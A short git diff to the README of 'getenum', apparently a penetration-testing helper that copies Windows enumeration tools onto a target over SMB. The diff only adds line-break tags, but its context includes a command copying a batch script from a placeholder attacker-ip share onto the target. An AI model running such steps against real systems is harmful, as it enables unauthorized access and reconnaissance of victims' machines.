@@ -1,5 +1,5 @@
 # getenum
-Windows - upload enumeration tools to target
+Windows - upload enumeration tools to target <br>
 NOTE: tools are current a/o 26 April 2022
 
 <br><hr>
@@ -26,9 +26,9 @@ copy \\<attacker-ip>\share\getenum.bat
 
 ## HAPPENINGS
 
-THE BATCH SCRIPT WILL CREATE C:\tmp\Enum
-... WILL USE SMB TO COPY FILES TO WINDOWS
-... USE README.txt (in Enum) TO SEE COMMANDS
+THE BATCH SCRIPT WILL CREATE C:\tmp\Enum <br>
+... WILL USE SMB TO COPY FILES TO WINDOWS <br>
+... USE README.txt (in Enum) TO SEE COMMANDS <br>
 
 ## DISCLAIMER
 
